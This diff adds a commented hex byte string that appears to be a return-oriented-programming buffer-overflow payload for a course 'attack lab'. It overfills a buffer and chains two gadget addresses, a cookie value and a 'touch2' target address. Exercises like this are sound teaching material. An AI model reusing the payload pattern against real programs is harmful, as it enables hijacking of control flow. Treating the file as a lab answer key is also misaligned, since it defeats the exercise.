@@ -1,0 +1,9 @@
+ff ff ff ff ff ff ff ff   /* rbuff_start: filler */
+ff ff ff ff ff ff ff ff   /* rbuff_8:     filler */
+ff ff ff ff ff ff ff ff   /* rbuff_16:    filler */
+ff ff ff ff ff ff ff ff   /* rbuff_24:    filler */
+ff ff ff ff ff ff ff ff   /* rbuff_end:   filler */
+cc 19 40 00 00 00 00 00   /* return_addr: gadget_1 */
+fa 97 b9 59 00 00 00 00   /* caller_0:    cookie */
+c5 19 40 00 00 00 00 00   /* caller_8:    gadget_2 */
+ec 17 40 00 00 00 00 00   /* caller_16:   touch2_addr */
